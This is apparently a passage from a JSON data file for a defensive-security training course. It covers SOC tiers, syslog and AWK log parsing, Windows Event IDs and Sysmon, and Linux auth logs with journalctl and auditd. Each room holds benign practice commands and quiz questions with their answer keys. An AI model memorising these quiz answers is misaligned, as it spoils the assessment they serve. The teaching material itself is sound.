        "concept": "A **Security Operations Centre (SOC)** monitors, detects, and responds to cybersecurity threats around the clock. Roles are structured into tiers to handle alert volume efficiently:\n- **Tier 1 (Triage Analyst):** Reviews incoming SIEM alerts, weeds out false positives, gathers initial context, and determines severity. Handles 80% of alert volume under strict Service Level Agreements (SLAs)\n- **Tier 2 (Incident Responder):** Receives escalated true positive alerts from Tier 1. Performs deep-dive host analysis, containment, root-cause investigation, and coordinates remediation\n- **Tier 3 (Senior Analyst / Threat Hunter):** Handles advanced forensics, reverse engineers malware samples, hunts for zero-day threats, and engineers new SIEM detection rules\n- **SOC Manager:** Oversees operations, manages staffing, metrics, and incident communications to executive leadership.",
        "whyItMatters": "Alert fatigue occurs when Tier 1 analysts are overwhelmed by thousands of false positives, leading to missed true attacks.",
        "examples": [
          "Tier 1: Review alert 'Potential Mimikatz execution', check parent process, escalate if verified",
          "Tier 2: Isolate host, dump memory, identify initial phishing vector, eradicate persistence"
        ],
        "commands": [
          {
            "cmd": "grep 'Failed password' /var/log/auth.log | head -n 5 2>/dev/null || echo 'Checked auth events'",
            "desc": "Inspect raw authentication alerts for initial triage"
          }
        ],
        "guidedExercise": "Perform a mock Tier 1 triage step by checking the frequency and origin IPs of failed authentication events.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-22-1",
            "type": "multiple-choice",
            "question": "Which SOC tier is primarily responsible for initial alert triage, reviewing raw SIEM alerts, and eliminating false positives?",
            "options": [
              "Tier 1 (Triage Analyst)",
              "Tier 2 (Incident Responder)",
              "Tier 3 (Threat Hunter)",
              "Chief Executive Officer"
            ],
            "correctIndex": 0,
            "hint": "The front-line defense tier.",
            "explanation": "Tier 1 analysts handle the high-volume initial triage and verification of SIEM alerts."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: SOC Performance Metrics: MTTD and MTTR",
        "concept": "SOC effectiveness is measured using quantitative operational metrics:\n- **Mean Time to Detect (MTTD):** The average time elapsed from when an adversary first breaches an environment until the security team detects the presence of the attack. Reducing MTTD minimizes adversary dwell time\n- **Mean Time to Respond / Remediate (MTTR):** The average time taken from alert confirmation to full containment and remediation (isolating the host, revoking tokens, blocking malicious IPs)\n- **False Positive Rate:** The percentage of generated alerts that represent benign, harmless business activity.",
        "whyItMatters": "World-class SOCs aim for an MTTD under 1 hour and an MTTR under 1 hour (the '1-10-60' rule).",
        "examples": [
          "Target: Detect intrusion within 1 minute, investigate within 10 minutes, contain within 60 minutes"
        ],
        "commands": [
          {
            "cmd": "date -u",
            "desc": "Inspect UTC timestamp synchronization critical for multi-host event correlation"
          }
        ],
        "guidedExercise": "Verify system UTC synchronization essential for cross-log timeline alignment.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-22-2",
            "type": "exact",
            "question": "What operational SOC metric measures the average time elapsed from initial intrusion until detection by security analysts?",
            "visualSlots": "_ _ _ _",
            "acceptedAnswers": [
              "MTTD",
              "Mean Time to Detect"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Four-letter acronym for Mean Time to Detect.",
            "explanation": "MTTD (Mean Time to Detect) measures how quickly an organization identifies active threats."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: SOC Operations & Playbooks Review",
        "concept": "Standard Operating Procedures (SOPs) and **Incident Playbooks** ensure consistent, repeatable triage during high-pressure incidents.",
        "whyItMatters": "Playbooks outline exact step-by-step actions for scenarios like Ransomware, Phishing, or Compromised Credentials.",
        "examples": [
          "Playbook: Suspected Phishing -> Extract sender IP, analyze attachment hash in sandbox, search enterprise mailboxes for identical message-id"
        ],
        "commands": [
          {
            "cmd": "echo 'SOC Playbooks Ensure Operational Consistency'",
            "desc": "Review core takeaway"
          }
        ],
        "guidedExercise": "Review and complete the guided exercise in the interactive sandbox.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "SOC tier roles (Tier 1 Triage, Tier 2 Response, Tier 3 Hunting), alert lifecycles, and core performance metrics (MTTD, MTTR).",
          "technicalTakeaways": "Tier 1 triages and escalates; Tier 2 contains and investigates; Tier 3 hunts and analyzes malware. Reducing MTTD and MTTR minimizes dwell time.",
          "commandsCovered": [
            "grep",
            "date -u"
          ],
          "commonMistakes": "Assuming Tier 1 analysts resolve all complex incidents without escalation.",
          "learningOutcome": "You can explain the structure of a modern SOC, execute alert triage workflows, and define MTTD and MTTR."
        },
        "questions": [
          {
            "id": "q-22-3",
            "type": "multiple-choice",
            "question": "Which key technical concept best summarizes your learning in Security Operations Centre Fundamentals?",
            "options": [
              "Analyze SOC tier structures: Tier 1 Triage, Tier 2 Incident Responder, Tier 3 Threat Hunter",
              "Ignoring operating system permissions and error logs",
              "Executing unauthorized attacks against production networks without scope",
              "Using plaintext passwords on unencrypted networks"
            ],
            "correctIndex": 0,
            "hint": "Reflect on the primary learning objective of this room.",
            "explanation": "Understanding Analyze SOC tier structures: Tier 1 Triage, Tier 2 Incident Responder, Tier 3 Threat Hunter is the central takeaway of this room."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-22-1",
        "type": "multiple-choice",
        "question": "Which SOC tier is primarily responsible for initial alert triage, reviewing raw SIEM alerts, and eliminating false positives?",
        "options": [
          "Tier 1 (Triage Analyst)",
          "Tier 2 (Incident Responder)",
          "Tier 3 (Threat Hunter)",
          "Chief Executive Officer"
        ],
        "correctIndex": 0,
        "hint": "The front-line defense tier.",
        "explanation": "Tier 1 analysts handle the high-volume initial triage and verification of SIEM alerts."
      },
      {
        "id": "q-22-2",
        "type": "exact",
        "question": "What operational SOC metric measures the average time elapsed from initial intrusion until detection by security analysts?",
        "visualSlots": "_ _ _ _",
        "acceptedAnswers": [
          "MTTD",
          "Mean Time to Detect"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Four-letter acronym for Mean Time to Detect.",
        "explanation": "MTTD (Mean Time to Detect) measures how quickly an organization identifies active threats."
      },
      {
        "id": "q-22-3",
        "type": "multiple-choice",
        "question": "Which key technical concept best summarizes your learning in Security Operations Centre Fundamentals?",
        "options": [
          "Analyze SOC tier structures: Tier 1 Triage, Tier 2 Incident Responder, Tier 3 Threat Hunter",
          "Ignoring operating system permissions and error logs",
          "Executing unauthorized attacks against production networks without scope",
          "Using plaintext passwords on unencrypted networks"
        ],
        "correctIndex": 0,
        "hint": "Reflect on the primary learning objective of this room.",
        "explanation": "Understanding Analyze SOC tier structures: Tier 1 Triage, Tier 2 Incident Responder, Tier 3 Threat Hunter is the central takeaway of this room."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: The SOC Tier Hierarchy & Alert Lifecycle",
        "instruction": "Perform a mock Tier 1 triage step by checking the frequency and origin IPs of failed authentication events.",
        "hints": [
          "The front-line defense tier."
        ]
      },
      {
        "title": "Task 2: SOC Performance Metrics: MTTD and MTTR",
        "instruction": "Verify system UTC synchronization essential for cross-log timeline alignment.",
        "hints": [
          "Four-letter acronym for Mean Time to Detect."
        ]
      },
      {
        "title": "Task 3: SOC Operations & Playbooks Review",
        "instruction": "Review and complete the guided exercise in the interactive sandbox.",
        "hints": [
          "Reflect on the primary learning objective of this room."
        ]
      }
    ],
    "nextRoomId": "room-23"
  },
  {
    "id": "room-23",
    "stageId": "defensive-security",
    "stageTitle": "Defensive Security",
    "stageOrder": 3,
    "stage": 3,
    "level": 3,
    "levelTitle": "Defensive Security",
    "roomNumber": 23,
    "title": "Log Analysis Fundamentals",
    "description": "Master the language of digital evidence: syslog formats, timestamp normalization, regex parsing, and multi-source event correlation.",
    "difficulty": "Intermediate",
    "difficultyBadge": "Intermediate",
    "estimatedTime": "35 mins",
    "xpReward": 50,
    "prerequisites": "room-22",
    "whyAreYouHere": "Master the language of digital evidence: syslog formats, timestamp normalization, regex parsing, and multi-source event correlation.",
    "objectives": [
      "Deconstruct standardized syslog message formats (RFC 5424)",
      "Normalize and align timestamps across heterogeneous timezone logs",
      "Extract Indicators of Compromise (IoCs) using regular expressions",
      "Perform multi-source event correlation to reconstruct attack timelines"
    ],
    "skillsGained": [
      "Syslog Parsing (RFC 5424)",
      "Timestamp Normalization",
      "Regex Data Extraction",
      "Timeline Reconstruction"
    ],
    "toolsAndCommands": [
      "grep -E",
      "awk",
      "sed",
      "sort -k",
      "uniq -c"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: Syslog Mechanics & RFC 5424 Architecture",
        "concept": "Operating systems, network switches, and services record events using the standardized **Syslog protocol** (RFC 5424). A standard syslog message contains:\n- **Facility Code (0-23):** Identifies the subsystem generating the message (e.g. `auth`, `daemon`, `kern`, `local0`)\n- **Severity Level (0-7):** Priority of the event:\n  - `0: Emergency (System unusable)`\n  - `1: Alert (Action required immediately)`\n  - `2: Critical`\n  - `3: Error`\n  - `4: Warning`\n  - `5: Notice (Normal but significant)`\n  - `6: Informational`\n  - `7: Debug`\n- **Timestamp:** ISO 8601 or RFC 3164 time of event\n- **Hostname / IP:** Originating machine\n- **Application / PID:** Process generating the event (e.g. `sshd[14205]`)\n- **Message Body:** Contextual event details.",
        "whyItMatters": "Security analysts configure forwarding rules to alert instantly on any facility `auth` event with severity <= 3.",
        "examples": [
          "Example Syslog: `Nov 18 14:22:01 server sshd[1240]: Failed password for invalid user admin from 192.168.1.100 port 54321 ssh2`"
        ],
        "commands": [
          {
            "cmd": "head -n 5 /var/log/syslog 2>/dev/null || journalctl -n 5",
            "desc": "Inspect real syslog event headers and facilities"
          }
        ],
        "guidedExercise": "Parse syslog headers to identify timestamp, facility, hostname, and message payload.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-23-1",
            "type": "exact",
            "question": "In the standard Syslog severity scale (0\u20137), which number represents the highest priority: Emergency (system unusable)?",
            "visualSlots": "_",
            "acceptedAnswers": [
              "0"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "The lowest number represents the highest urgency.",
            "explanation": "Severity 0 is Emergency, indicating the system is unusable."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: Log Parsing with AWK, Grep & Regular Expressions",
        "concept": "When analyzing gigabytes of raw logs, command-line parsing tools are unmatched for speed. **AWK** treats whitespace-separated log columns as fields (`$1, $2, ... $NF`):\n- Extract specific fields: `awk '{print $1, $5, $9}' access.log`\n- Filter lines by condition: `awk '$9 == 404 {print $7}' access.log` (print URI paths that returned 404)\n- Count unique frequencies: `awk '{print $1}' access.log | sort | uniq -c | sort -rn | head -n 10` (identify top 10 requesting IP addresses).",
        "whyItMatters": "A simple awk one-liner can instantly reveal web scanning or brute-force attack sources in web server access logs.",
        "examples": [
          "Extract IP from Nginx log: `awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c`",
          "Find SSH brute-force source IPs: `grep 'Failed password' /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c`"
        ],
        "commands": [
          {
            "cmd": "cat /etc/passwd | awk -F: '{print $1, $3, $7}'",
            "desc": "Use AWK with custom colon delimiter to extract usernames, UIDs, and login shells"
          }
        ],
        "guidedExercise": "Use AWK to extract specific fields from delimited system files.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-23-2",
            "type": "exact",
            "question": "In an AWK script, which built-in variable represents the total number of fields (columns) in the current record?",
            "visualSlots": "_ _",
            "acceptedAnswers": [
              "NF"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Short for Number of Fields.",
            "explanation": "NF holds the number of fields in the current line, allowing reference to the last column as $NF."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: Timestamp Alignment & Timeline Review",
        "concept": "Heterogeneous logs arrive with different timestamp formats (epoch milliseconds, UTC, localized timezone offsets like PST or IST). Prior to incident reconstruction, all timestamps must be normalized to **Coordinated Universal Time (UTC)** to prevent misinterpreting attack causality.",
        "whyItMatters": "An adversary event that appears to happen after an alert may simply be an unnormalized timezone offset.",
        "examples": [
          "Timeline alignment: Convert all events to UTC ISO 8601 (`YYYY-MM-DDTHH:MM:SSZ`)"
        ],
        "commands": [
          {
            "cmd": "date -u +'%Y-%m-%dT%H:%M:%SZ'",
            "desc": "Output current system time in standardized UTC ISO 8601 format"
          }
        ],
        "guidedExercise": "Review and complete the guided exercise in the interactive sandbox.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "Syslog architecture (RFC 5424 facilities and severities 0-7), AWK/grep parsing, and UTC timestamp normalization.",
          "technicalTakeaways": "AWK pipelines rapidly extract top IP frequencies and error codes. Normalize all timestamps to UTC to reconstruct accurate attack timelines.",
          "commandsCovered": [
            "awk",
            "grep -E",
            "uniq -c",
            "sort -rn",
            "date -u"
          ],
          "commonMistakes": "Assuming all logs share the same timezone, leading to inverted cause-and-effect timelines.",
          "learningOutcome": "You can parse raw syslog streams, extract threat indicators using AWK, and construct correlated UTC attack timelines."
        },
        "questions": [
          {
            "id": "q-23-3",
            "type": "multiple-choice",
            "question": "Which key technical concept best summarizes your learning in Log Analysis Fundamentals?",
            "options": [
              "Deconstruct standardized syslog message formats (RFC 5424)",
              "Ignoring operating system permissions and error logs",
              "Executing unauthorized attacks against production networks without scope",
              "Using plaintext passwords on unencrypted networks"
            ],
            "correctIndex": 0,
            "hint": "Reflect on the primary learning objective of this room.",
            "explanation": "Understanding Deconstruct standardized syslog message formats (RFC 5424) is the central takeaway of this room."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-23-1",
        "type": "exact",
        "question": "In the standard Syslog severity scale (0\u20137), which number represents the highest priority: Emergency (system unusable)?",
        "visualSlots": "_",
        "acceptedAnswers": [
          "0"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "The lowest number represents the highest urgency.",
        "explanation": "Severity 0 is Emergency, indicating the system is unusable."
      },
      {
        "id": "q-23-2",
        "type": "exact",
        "question": "In an AWK script, which built-in variable represents the total number of fields (columns) in the current record?",
        "visualSlots": "_ _",
        "acceptedAnswers": [
          "NF"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Short for Number of Fields.",
        "explanation": "NF holds the number of fields in the current line, allowing reference to the last column as $NF."
      },
      {
        "id": "q-23-3",
        "type": "multiple-choice",
        "question": "Which key technical concept best summarizes your learning in Log Analysis Fundamentals?",
        "options": [
          "Deconstruct standardized syslog message formats (RFC 5424)",
          "Ignoring operating system permissions and error logs",
          "Executing unauthorized attacks against production networks without scope",
          "Using plaintext passwords on unencrypted networks"
        ],
        "correctIndex": 0,
        "hint": "Reflect on the primary learning objective of this room.",
        "explanation": "Understanding Deconstruct standardized syslog message formats (RFC 5424) is the central takeaway of this room."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Syslog Mechanics & RFC 5424 Architecture",
        "instruction": "Parse syslog headers to identify timestamp, facility, hostname, and message payload.",
        "hints": [
          "The lowest number represents the highest urgency."
        ]
      },
      {
        "title": "Task 2: Log Parsing with AWK, Grep & Regular Expressions",
        "instruction": "Use AWK to extract specific fields from delimited system files.",
        "hints": [
          "Short for Number of Fields."
        ]
      },
      {
        "title": "Task 3: Timestamp Alignment & Timeline Review",
        "instruction": "Review and complete the guided exercise in the interactive sandbox.",
        "hints": [
          "Reflect on the primary learning objective of this room."
        ]
      }
    ],
    "nextRoomId": "room-24"
  },
  {
    "id": "room-24",
    "stageId": "defensive-security",
    "stageTitle": "Defensive Security",
    "stageOrder": 3,
    "stage": 3,
    "level": 3,
    "levelTitle": "Defensive Security",
    "roomNumber": 24,
    "title": "Windows Event Logs",
    "description": "Master Windows forensic auditing: Event Viewer, essential Security Event IDs (4624, 4625, 4688, 7045), and Sysmon telemetry.",
    "difficulty": "Intermediate",
    "difficultyBadge": "Intermediate",
    "estimatedTime": "40 mins",
    "xpReward": 50,
    "prerequisites": "room-23",
    "whyAreYouHere": "Master Windows forensic auditing: Event Viewer, essential Security Event IDs (4624, 4625, 4688, 7045), and Sysmon telemetry.",
    "objectives": [
      "Analyze Windows Event Log architecture (System, Security, Application)",
      "Master critical authentication Event IDs: 4624 (Logon) and 4625 (Failed Logon)",
      "Investigate process creation (Event ID 4688) and service installation (Event ID 7045)",
      "Deploy and analyze Microsoft Sysmon telemetry (Process creation, Network connect, DNS query)"
    ],
    "skillsGained": [
      "Windows Event Logs",
      "Event ID 4624/4625",
      "Event ID 4688 & 7045",
      "Sysmon Telemetry"
    ],
    "toolsAndCommands": [
      "wevtutil",
      "Get-WinEvent",
      "findstr",
      "Sysmon -c"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: Windows Event Log Architecture & Critical Security IDs",
        "concept": "Windows records system activity in binary XML format (`.evtx`) files located in `C:\\Windows\\System32\\winevt\\Logs`. The primary logs are:\n- **Application.evtx:** Events logged by installed programs\n- **System.evtx:** Windows OS system events (driver loads, hardware changes)\n- **Security.evtx:** Audit policy events (logons, object access, privilege usage).\nCritical Security Event IDs to memorize for blue team investigations:\n- **Event ID 4624:** Successful Account Logon (contains Logon Type: Type 2 = Interactive keyboard login, Type 3 = Network share/SMB, Type 10 = Remote Desktop/RDP)\n- **Event ID 4625:** Failed Account Logon (indicates password brute-force or credential stuffing)\n- **Event ID 4688:** A new process has been created (essential for detecting malware command execution; must enable command-line auditing)\n- **Event ID 7045 (System log):** A new service was installed in the system (frequently used for persistence and privilege escalation by tools like PsExec or Cobalt Strike).",
        "whyItMatters": "Logon Type 10 in Event ID 4624 specifically flags interactive Remote Desktop (RDP) sessions.",
        "examples": [
          "Logon Type 2: Local console keyboard login",
          "Logon Type 3: Network login (e.g. accessing a network file share)",
          "Logon Type 10: Remote Desktop (RDP) login"
        ],
        "commands": [
          {
            "cmd": "echo 'Windows Event ID 4624: Successful Logon | Event ID 4625: Failed Logon'",
            "desc": "Reference core Windows Security IDs"
          }
        ],
        "guidedExercise": "Review the core Windows Event IDs used to track adversary lateral movement.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-24-1",
            "type": "exact",
            "question": "Which Windows Security Event ID records an unsuccessful account logon attempt?",
            "visualSlots": "_ _ _ _",
            "acceptedAnswers": [
              "4625"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Follows 4624.",
            "explanation": "Event ID 4625 is generated whenever an account logon attempt fails."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: Microsoft Sysmon (System Monitor) Telemetry",
        "concept": "Standard Windows event logging often lacks the granularity needed for deep threat detection. **Sysmon** (Microsoft Sysinternals System Monitor) is a free kernel driver and service that records detailed security telemetry into `Microsoft-Windows-Sysmon/Operational.evtx`:\n- **Sysmon Event ID 1:** Process Creation (includes complete command-line parameters, parent process, file hashes, and parent executable path)\n- **Sysmon Event ID 3:** Network Connection (identifies which process initiated an outbound network connection, destination IP, and port)\n- **Sysmon Event ID 7:** Image Loaded (detects DLL injection and hijacking)\n- **Sysmon Event ID 11:** File Created (tracks malware dropped onto disk)\n- **Sysmon Event ID 22:** DNS Query (records the exact domain name queried by a specific executable, uncovering C2 domains).",
        "whyItMatters": "Sysmon Event ID 1 captures the entire malicious command-line string (e.g. `powershell.exe -enc ...`), exposing hidden payloads.",
        "examples": [
          "Sysmon ID 1: Detects `cmd.exe` spawned by `WINWORD.EXE` (classic malicious macro execution)",
          "Sysmon ID 22: Detects `malware.exe` querying DNS for `c2.evil.com`"
        ],
        "commands": [
          {
            "cmd": "echo 'Sysmon Event ID 1: Process Create | Sysmon Event ID 3: Network Connect | Sysmon Event ID 22: DNS Query'",
            "desc": "Reference Sysmon IDs"
          }
        ],
        "guidedExercise": "Compare default Windows process auditing with Sysmon Event ID 1 full command-line logging.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-24-2",
            "type": "exact",
            "question": "Which Sysmon Event ID records outbound process network connections, including source and destination IP and port?",
            "visualSlots": "_",
            "acceptedAnswers": [
              "3",
              "Event ID 3"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Single digit number for Network Connection.",
            "explanation": "Sysmon Event ID 3 monitors and logs TCP/UDP network connections initiated by processes."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: Windows Investigation & Event Log Review",
        "concept": "PowerShell's `Get-WinEvent` cmdlet allows analysts to filter `.evtx` files programmatically:\n`Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} | Select-Object TimeCreated, Message`\nExporting `.evtx` files for timeline analysis in tools like Eric Zimmerman's Timeline Explorer is standard forensic practice.",
        "whyItMatters": "Combining Event ID 4624 with Sysmon Event ID 1 reconstructs who logged in and what commands they ran.",
        "examples": [
          "Forensic Chain: Event 4624 (Logon from 192.168.1.50) -> Sysmon 1 (cmd.exe runs `whoami /priv`) -> Sysmon 3 (outbound connect to external C2)"
        ],
        "commands": [
          {
            "cmd": "echo 'Windows Forensic Auditing Mastered'",
            "desc": "Complete Windows Log Review"
          }
        ],
        "guidedExercise": "Review and complete the guided exercise in the interactive sandbox.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "Windows Event Log architecture (.evtx), core Security IDs (4624, 4625, 4688, 7045), and Microsoft Sysmon telemetry (IDs 1, 3, 22).",
          "technicalTakeaways": "Event ID 4624 tracks logins by logon type (Type 10 = RDP). Sysmon Event 1 logs complete process command lines, exposing obfuscated payloads.",
          "commandsCovered": [
            "Get-WinEvent",
            "wevtutil"
          ],
          "commonMistakes": "Failing to enable command-line process auditing in Event ID 4688, resulting in lost arguments.",
          "learningOutcome": "You can audit Windows Security logs, detect brute-force attacks via 4625, trace process execution with Sysmon 1, and identify service persistence."
        },
        "questions": [
          {
            "id": "q-24-3",
            "type": "multiple-choice",
            "question": "Which key technical concept best summarizes your learning in Windows Event Logs?",
            "options": [
              "Analyze Windows Event Log architecture (System, Security, Application)",
              "Ignoring operating system permissions and error logs",
              "Executing unauthorized attacks against production networks without scope",
              "Using plaintext passwords on unencrypted networks"
            ],
            "correctIndex": 0,
            "hint": "Reflect on the primary learning objective of this room.",
            "explanation": "Understanding Analyze Windows Event Log architecture (System, Security, Application) is the central takeaway of this room."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-24-1",
        "type": "exact",
        "question": "Which Windows Security Event ID records an unsuccessful account logon attempt?",
        "visualSlots": "_ _ _ _",
        "acceptedAnswers": [
          "4625"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Follows 4624.",
        "explanation": "Event ID 4625 is generated whenever an account logon attempt fails."
      },
      {
        "id": "q-24-2",
        "type": "exact",
        "question": "Which Sysmon Event ID records outbound process network connections, including source and destination IP and port?",
        "visualSlots": "_",
        "acceptedAnswers": [
          "3",
          "Event ID 3"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Single digit number for Network Connection.",
        "explanation": "Sysmon Event ID 3 monitors and logs TCP/UDP network connections initiated by processes."
      },
      {
        "id": "q-24-3",
        "type": "multiple-choice",
        "question": "Which key technical concept best summarizes your learning in Windows Event Logs?",
        "options": [
          "Analyze Windows Event Log architecture (System, Security, Application)",
          "Ignoring operating system permissions and error logs",
          "Executing unauthorized attacks against production networks without scope",
          "Using plaintext passwords on unencrypted networks"
        ],
        "correctIndex": 0,
        "hint": "Reflect on the primary learning objective of this room.",
        "explanation": "Understanding Analyze Windows Event Log architecture (System, Security, Application) is the central takeaway of this room."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Windows Event Log Architecture & Critical Security IDs",
        "instruction": "Review the core Windows Event IDs used to track adversary lateral movement.",
        "hints": [
          "Follows 4624."
        ]
      },
      {
        "title": "Task 2: Microsoft Sysmon (System Monitor) Telemetry",
        "instruction": "Compare default Windows process auditing with Sysmon Event ID 1 full command-line logging.",
        "hints": [
          "Single digit number for Network Connection."
        ]
      },
      {
        "title": "Task 3: Windows Investigation & Event Log Review",
        "instruction": "Review and complete the guided exercise in the interactive sandbox.",
        "hints": [
          "Reflect on the primary learning objective of this room."
        ]
      }
    ],
    "nextRoomId": "room-25"
  },
  {
    "id": "room-25",
    "stageId": "defensive-security",
    "stageTitle": "Defensive Security",
    "stageOrder": 3,
    "stage": 3,
    "level": 3,
    "levelTitle": "Defensive Security",
    "roomNumber": 25,
    "title": "Linux Log Analysis",
    "description": "Master Linux forensic investigation: /var/log hierarchy, auth.log brute-force detection, systemd journalctl querying, and auditd system auditing.",
    "difficulty": "Intermediate",
    "difficultyBadge": "Intermediate",
    "estimatedTime": "35 mins",
    "xpReward": 50,
    "prerequisites": "room-24",
    "whyAreYouHere": "Master Linux forensic investigation: /var/log hierarchy, auth.log brute-force detection, systemd journalctl querying, and auditd system auditing.",
    "objectives": [
      "Analyze Linux logging architecture (/var/log/auth.log, syslog, wtmp, btmp)",
      "Detect SSH brute-force and credential stuffing campaigns",
      "Query systemd binary journals using journalctl time and unit filters",
      "Configure Linux Audit Framework (auditd) to monitor file modifications and syscalls"
    ],
    "skillsGained": [
      "Linux /var/log Hierarchy",
      "SSH Brute-Force Triage",
      "Journalctl Advanced Queries",
      "Auditd Framework"
    ],
    "toolsAndCommands": [
      "last",
      "lastb",
      "journalctl -u",
      "ausearch",
      "aureport"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: The /var/log Hierarchy & Authentication Triage",
        "concept": "On Linux systems, system and service logs are stored in `/var/log`:\n- `/var/log/auth.log` (Debian/Ubuntu) or `/var/log/secure` (RHEL/CentOS): Records all authentication events, user logins, SSH sessions, and sudo privilege escalation attempts\n- `/var/log/syslog` or `/var/log/messages`: General system activity and service daemon logs\n- `/var/log/wtmp`: Binary log recording all historical user logins and system reboots (viewed using `last`)\n- `/var/log/btmp`: Binary log recording all failed login attempts (viewed using `lastb`)\n- `/var/log/faillog`: Database of failed login counts per user.\nDetecting SSH brute-force attacks involves parsing `auth.log` for bursts of 'Failed password for invalid user' messages.",
        "whyItMatters": "Checking `lastb` reveals immediate automated credential-stuffing sweeps against your server.",
        "examples": [
          "Inspect successful logins: `last -n 10`",
          "Inspect failed login attempts: `sudo lastb -n 10`",
          "Find top attacker IPs: `grep 'Failed password' /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -n 5`"
        ],
        "commands": [
          {
            "cmd": "last -n 5 2>/dev/null || echo 'Checked last logins'",
            "desc": "Display last 5 logged-in user sessions from /var/log/wtmp"
          }
        ],
        "guidedExercise": "Execute the last command to review recent interactive user sessions.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-25-1",
            "type": "exact",
            "question": "Which Linux command displays failed login attempts recorded in the /var/log/btmp binary log?",
            "visualSlots": "_ _ _ _ _",
            "acceptedAnswers": [
              "lastb"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "The letter 'b' appended to 'last'.",
            "explanation": "lastb reads /var/log/btmp to display failed authentication attempts."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: Systemd Journalctl Filtering",
        "concept": "Modern Linux distributions manage system logging via the `systemd-journald` daemon, recording structured binary events into `/run/log/journal` or `/var/log/journal`. The `journalctl` utility provides fast, powerful filtering:\n- Filter by service unit: `journalctl -u ssh.service`\n- Filter by time window: `journalctl --since '2026-11-18 10:00:00' --until '2026-11-18 12:00:00'`\n- Filter by priority/severity: `journalctl -p err` (shows Error, Critical, Alert, Emergency)\n- Follow live events: `journalctl -f`\n- Filter by kernel messages: `journalctl -k` (dmesg equivalent).",
        "whyItMatters": "Filtering journalctl by time window isolates adversary activity during a known breach window.",
        "examples": [
          "journalctl -u nginx --since yesterday: Review web server events over the last 24 hours",
          "journalctl -p 3 -xb: Review errors and critical events from the current boot"
        ],
        "commands": [
          {
            "cmd": "journalctl -n 10 --no-pager",
            "desc": "Display last 10 journal entries without opening interactive pager"
          }
        ],
        "guidedExercise": "Query the system journal for recent error-level events.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-25-2",
            "type": "exact",
            "question": "Which journalctl flag is used to specify and filter events by a specific systemd service unit name?",
            "visualSlots": "- _",
            "acceptedAnswers": [
              "-u",
              "u"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Single letter flag for Unit.",
            "explanation": "journalctl -u <unit> filters log output specifically to that service."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: Linux Audit Framework (auditd) & Review",
        "concept": "For high-security compliance and forensic monitoring, Linux provides **auditd** (the Linux Audit Framework). Unlike standard application logs, auditd hooks directly into the Linux kernel to monitor exact system calls:\n- Track modifications to `/etc/passwd`: `auditctl -w /etc/passwd -p wa -k identity_changes`\n- Monitor execution of `sudo`: `auditctl -a always,exit -F arch=b64 -S execve -F euid=0 -k root_exec`\n- Search audit events: `ausearch -k identity_changes`\n- Generate summary audit reports: `aureport --auth`.",
        "whyItMatters": "auditd records file changes and syscall executions even if the attacker does not generate application logs.",
        "examples": [
          "auditctl: Configure live kernel audit rules",
          "ausearch: Query /var/log/audit/audit.log by key or PID"
        ],
        "commands": [
          {
            "cmd": "sudo auditctl -s 2>/dev/null || echo 'Audit framework inspected'",
            "desc": "Check status of the Linux audit subsystem"
          }
        ],
        "guidedExercise": "Review and complete the guided exercise in the interactive sandbox.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "/var/log authentication logs (auth.log, wtmp, btmp), last/lastb, journalctl structured filtering, and kernel syscall auditing via auditd.",
          "technicalTakeaways": "auth.log exposes SSH brute-force attacks; lastb displays failed login attempts. auditd hooks kernel syscalls to log file tampering.",
          "commandsCovered": [
            "last",
            "lastb",
            "journalctl -u",
            "journalctl -p",
            "auditctl",
            "ausearch"
          ],
          "commonMistakes": "Looking in /var/log/syslog for failed SSH passwords instead of /var/log/auth.log or secure.",
